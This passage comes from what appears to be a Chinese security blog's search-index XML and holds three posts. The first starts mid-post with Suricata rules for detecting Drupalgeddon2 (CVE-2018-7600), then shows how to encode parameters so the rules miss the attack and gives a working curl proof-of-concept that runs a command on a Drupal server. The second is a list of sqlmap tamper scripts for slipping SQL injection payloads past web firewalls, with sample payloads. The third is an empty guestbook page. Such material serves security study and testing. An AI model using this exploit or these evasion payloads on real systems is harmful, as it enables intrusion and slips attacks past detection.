 content: &quot;POST&quot;; http_method;\  pcre: &quot;/form_id=user_register_form/Pi&quot;;\  sid: 10002807;\  rev: 1;\)</code></pre><p>通用规则：</p><pre><code>alert http any any -&gt; $HOME_NET any (\  msg: &quot;ATTACK [PTsecurity] Drupalgeddon2 &lt;8.3.9 &lt;8.4.6 &lt;8.5.1 RCE through registration form (CVE-2018-7600)&quot;; \  flow: established, to_server; \  content: &quot;/user/register&quot;; http_uri; \  content: &quot;POST&quot;; http_method; \  content: &quot;drupal&quot;; http_client_body; \  pcre: &quot;/(%23|#)(access_callback|pre_render|post_render|lazy_builder)/Pi&quot;; \  reference: cve, 2018-7600; \  reference: url, research.checkpoint.com/uncovering-drupalgeddon-2; \  classtype: attempted-admin; \  reference: url, github.com/ptresearch/AttackDetection; \  metadata: Open Ptsecurity.com ruleset; \  sid: 10002808; \  rev: 2; \)</code></pre><p>在重启Suricata后，我的攻击被成功报警：</p><p>可以看到，我们得到了两条日志：</p><blockquote><p>​    1.ATTACK [PTsecurity] Drupalgeddon2 &lt;8.3.9 &lt;8.4.6 &lt;8.5.1 RCE through registration form (CVE-2018-7600) [Priority: 1] {PROTO:006} 172.17.0.6:51702 -&gt; 172.17.0.1:8080</p><p>​    2.Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 172.17.0.6:51702 -&gt; 172.17.0.1:8080</p></blockquote><h2 id="Bypass！"><a href="#Bypass！" class="headerlink" title="Bypass！"></a>Bypass！</h2><p>这两条规则其实都很容易绕过。首先，对于敏感字段form_id=user_register_form，我们可将其替换为如下内容：</p><pre><code>form%5bid=user_register_form</code></pre><p>如上图所见，现在只有通用规则的警报。分析通用规则的正则表达式，我们可以看到它对#和%23敏感，但不涉及下划线的编码。因此，我们可以使用post%5frender代替post_render来绕过：</p><p>最后得出可绕过两个规则的PoC：</p><pre><code>#!/bin/bashURL=&quot;/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&quot;QSTRING=&quot;form%5bid=user_register_form&amp;_drupal_ajax=1&amp;mail[#post%5frender][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=&quot;COMMAND=&quot;id&quot;curl -v -d &quot;$&#123;QSTRING&#125;$&#123;COMMAND&#125;&quot; &quot;http://172.17.0.1:8080$URL&quot;</code></pre><p>转自<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="2020/02/01/sqlmap-tamper/"/>
      <url>2020/02/01/sqlmap-tamper/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap_tamper"></a>sqlmap_tamper</h1><ol><li><p>apostrophemask.py    用UTF-8全角字符替换单引号字符</p></li><li><p>apostrophenullencode.py     用非法双字节unicode字符替换单引号字符</p></li><li><p>appendnullbyte.py    在payload末尾添加空字符编码</p></li><li><p>base64encode.py    对给定的payload全部字符使用Base64编码</p></li><li><p>between.py    分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</p></li><li><p>bluecoat.py    在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</p></li><li><p>chardoubleencode.py    对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</p></li><li><p>charencode.py    对给定的payload全部字符使用URL编码（不处理已经编码的字符）</p></li><li><p>charunicodeencode.py    对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</p></li><li><p>concat2concatws.py    用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</p></li><li><p>equaltolike.py    用“LIKE”运算符替换全部等于号“=”</p></li><li><p>greatest.py    用“GREATEST”函数替换大于号“&gt;”</p></li><li><p>halfversionedmorekeywords.py     在每个关键字之前添加MySQL注释</p></li><li><p>ifnull2ifisnull.py    用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</p></li><li><p>lowercase.py    用小写值替换每个关键字字符</p></li><li><p>modsecurityversioned.py     用注释包围完整的查询</p></li><li><p>modsecurityzeroversioned.py     用当中带有数字零的注释包围完整的查询</p></li><li><p>multiplespaces.py    在SQL关键字周围添加多个空格</p></li><li><p>nonrecursivereplacement.py     用representations替换预定义SQL关键字，适用于过滤器</p></li><li><p>overlongutf8.py    转换给定的payload当中的所有字符</p></li><li><p>percentage.py    在每个字符之前添加一个百分号</p></li><li><p>randomcase.py    随机转换每个关键字字符的大小写</p></li><li><p>randomcomments.py    向SQL关键字中插入随机注释</p></li><li><p>securesphere.py    添加经过特殊构造的字符串</p></li><li><p>sp_password.py    向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</p></li><li><p>space2comment.py    用“/**/”替换空格符</p></li><li><p>space2dash.py    用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2hash.py    用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2morehash.py    用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</p></li><li><p>space2mssqlblank.py    用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>space2mssqlhash.py    用磅注释符“#”其次是一个换行符替换空格符</p></li><li><p>space2mysqlblank.py    用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>space2mysqldash.py    用破折号注释符“–”其次是一个换行符替换空格符</p></li><li><p>space2plus.py    用加号“+”替换空格符</p></li><li><p>space2randomblank.py    用一组有效的备选字符集当中的随机空白符替换空格符</p></li><li><p>unionalltounion.py    用“UNION SELECT”替换“UNION ALL SELECT”</p></li><li><p>unmagicquotes.py    用一个多字节组合%bf%27和末尾通用注释一起替换空格符</p></li><li><p>varnish.py    添加一个HTTP头“X-originating-IP”来绕过WAF</p></li><li><p>versionedkeywords.py    用MySQL注释包围每个非函数关键字</p></li><li><p>versionedmorekeywords.py     用MySQL注释包围每个关键字</p></li><li><p>xforwardedfor.py    添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</p></li></ol><ol><li><h3 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h3></li></ol><p>适用数据库：ALL<br> 作用：将引号替换为utf-8，用于过滤单引号<br> 使用脚本前：tamper(“1 AND ‘1’=’1”)<br> 使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><ol start="2"><li><h3 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h3></li></ol><p>适用数据库：ALL<br> 作用：替换为base64编码<br> 使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br> 使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p><ol start="3"><li><h3 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h3></li></ol><p>适用数据库：ALL<br> 作用：围绕sql关键字添加多个空格<br> 使用脚本前：tamper(‘1 UNION SELECT foobar’)<br> 使用脚本后：1 UNION SELECT foobar</p><ol start="4"><li><h3 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h3></li></ol><p>适用数据库：ALL<br> 作用：用加号替换空格<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT+id+FROM+users</p><ol start="5"><li><h3 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h3></li></ol><p>适用数据库：ALL<br> 作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br> 使用脚本前：tamper(‘1 UNION SELECT 2–’)<br> 使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p><ol start="6"><li><h3 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h3></li></ol><p>适用数据库：ALL<br> 作用：将空格替换为其他有效字符<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT%0Did%0DFROM%0Ausers</p><ol start="7"><li><h3 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h3></li></ol><p>适用数据库：ALL<br> 作用：将union allselect 替换为unionselect<br> 使用脚本前：tamper(‘-1 UNION ALL SELECT’)<br> 使用脚本后：-1 UNION SELECT</p><ol start="8"><li><h3 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h3></li></ol><p>适用数据库：ALL<br> 作用：追加特定的字符串<br> 使用脚本前：tamper(‘1 AND 1=1’)<br> 使用脚本后：1 AND 1=1 and ‘0having’=’0having’</p><ol start="9"><li><h3 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h3></li></ol><p>适用数据库：ALL<br> 作用：将空格替换为–，并添加一个随机字符串和换行符<br> 使用脚本前：tamper(‘1 AND 9227=9227’)<br> 使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227</p><ol start="10"><li><h3 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3></li></ol><p>适用数据库：Microsoft SQL Server<br> 测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005<br> 作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT%0Eid%0DFROM%07users</p><ol start="11"><li><h3 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：用NOT BETWEEN 0 AND #替换&gt;<br> 使用脚本前：tamper(‘1 AND A &gt; B–’)<br> 使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p><ol start="12"><li><h3 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h3></li></ol><p>适用数据库：ASP<br> 测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0<br> 作用：在每个字符前添加一个%<br> 使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)<br> 使用脚本</p><p>后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p><ol start="13"><li><h3 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h3></li></ol><p>适用数据库：MSSQL<br> 作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password<br> 使用脚本前：tamper(‘1 AND 9227=9227– ‘)<br> 使用脚本后：1 AND 9227=9227– sp_password</p><ol start="14"><li><h3 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）<br> 使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br> 使用脚本</p><p>后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p><ol start="15"><li><h3 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：随机大小写<br> 使用脚本前：tamper(‘INSERT’)<br> 使用脚本后：INseRt</p><ol start="16"><li><h3 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h3></li></ol><p>适用数据库：ASP、ASP.NET<br> 测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3<br> 作用：适用字符串的unicode编码<br> 使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)<br> 使用脚本</p><p>后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p><ol start="17"><li><h3 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：将空格替换为/<strong>/<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT/</strong>/id/<strong>/FROM/</strong>/users</p><ol start="18"><li><h3 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3></li></ol><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5<br> 作用：将=替换为LIKE<br> 使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)<br> 使用脚本后：SELECT * FROM users WHERE id LIKE 1</p><ol start="19"><li><h3 id="equaltolike-py-1"><a href="#equaltolike-py-1" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h3></li></ol><p>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0<br> 作用：将&gt;替换为GREATEST，绕过对&gt;的过滤<br> 使用脚本前：tamper(‘1 AND A &gt; B’)<br> 使用脚本后：1 AND GREATEST(A,B+1)=A</p><ol start="20"><li><h3 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h3></li></ol><p>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br> 测试通过数据库：MySQL 5.0 and 5.5<br> 作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤<br> 使用脚本前：tamper(‘IFNULL(1, 2)’)<br> 使用脚本后：IF(ISNULL(1),2,1)</p><ol start="21"><li><h3 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h3></li></ol><p>适用数据库：MySQL<br> 测试通过数据库：MySQL 5.0<br> 作用：过滤空格，使用mysql内联注释的方式进行注入<br> 使用脚本前：tamper(‘1 AND 2&gt;1–’)<br> 使用脚本后：1 /<em>!30874AND 2&gt;1</em>/–</p><ol start="22"><li><h3 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h3></li></ol><p>适用数据库：MySQL<br> 测试通过数据库：MySQL 5.1<br> 作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)<br> 使用脚本前：tamper(‘SELECT id FROM users’)<br> 使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p><ol start="23"><li><h3 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h3></li></ol><p>适用数据库：MySQL<br> 测试通过数据库：MySQL 5.0<br> 作用：使用内联注释方式（/<em>!00000</em>/）进行注入<br> 使用脚本前：tamper(‘1 AND 2&gt;1–’)<br> 使用脚本后：1 /<em>!00000AND 2&gt;1</em>/–</p><ol start="24"><li><h3 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h3></li></ol><p>适用数据库：MySQL、MSSQL<br> 作用：将空格替换为 – ，并追随一个换行符<br> 使用脚本前：tamper(‘1 AND 9227=9227’)<br> 使用脚本后：1–%0AAND–%0A9227=9227</p><ol start="25"><li><h3 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h3></li></ol><p>适用数据库：Blue Coat SGOS<br> 测试通过数据库：MySQL 5.1,、SGOS<br> 作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br> 使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br> 使用脚本后：SELECT%09id FROM users where id LIKE 1</p><ol start="26"><li><h3 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h3></li></ol><p>适用数据库：MySQL<br> 测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br> 作用：注释绕过<br> 使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, </p><p>CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br> 使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,</p><p>CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p><ol start="27"><li><h3 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h3></li></ol><p>适用数据库：MySQL &lt; 5.1<br> 测试通过数据库：MySQL 4.0.18/5.0.22<br> 作用：在每个关键字前添加mysql版本注释<br> 使用脚本前：tamper(“value’ UNION ALL SELECT </p><p>CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS </p><p>CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND </p><p>‘QDWa’=’QDWa”)<br> 使用脚本后：</p><p>value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</p><ol start="28"><li><h3 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h3></li></ol><p>适用数据库：MySQL &gt;= 5.1.13<br> 测试通过数据库：MySQL 5.1.41<br> 作用：将空格替换为#，并添加一个随机字符串和换行符<br> 使用脚本前：tamper(‘1 AND 9227=9227’)<br> 使用脚本后：</p><p>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p><ol start="29"><li><h3 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h3></li></ol><p>适用数据库：ALL<br> 作用：用非法双字节Unicode字符替换单引号<br> 使用脚本前：tamper(“1 AND ‘1’=’1”)<br> 使用脚本后：1 AND %00%271%00%27=%00%271</p><ol start="30"><li><h3 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h3></li></ol><p>适用数据库：ALL<br> 作用：在有效载荷的结束位置加载null字节字符编码<br> 使用脚本前：tamper(‘1 AND 1=1’)<br> 使用脚本后：1 AND 1=1%00</p><ol start="31"><li><h3 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h3></li></ol><p>适用数据库：ALL<br> 作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br> 使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br> 使用脚本</p><p>后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p><ol start="32"><li><h3 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h3></li></ol><p>适用数据库：ALL<br> 作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br> 使用脚本前：tamper(“1’ AND 1=1”)<br> 使用脚本后：1%bf%27 AND 1=1–</p><ol start="33"><li><h3 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h3></li></ol><p>适用数据库：ALL<br> 作用：用注释符分割sql关键字<br> 使用脚本前：tamper(‘INSERT’)<br> 使用脚本后：I/<strong>/N/</strong>/SERT</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逐梦</title>
      <link href="2019/09/07/0xdadream/"/>
      <url>2019/09/07/0xdadream/</url>
      
        <content type="html"><![CDATA[<h2 id="这一页用来留言，交流"><a href="#这一页用来留言，交流" class="headerlink" title="这一页用来留言，交流"></a>这一页用来留言，交流</h2>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
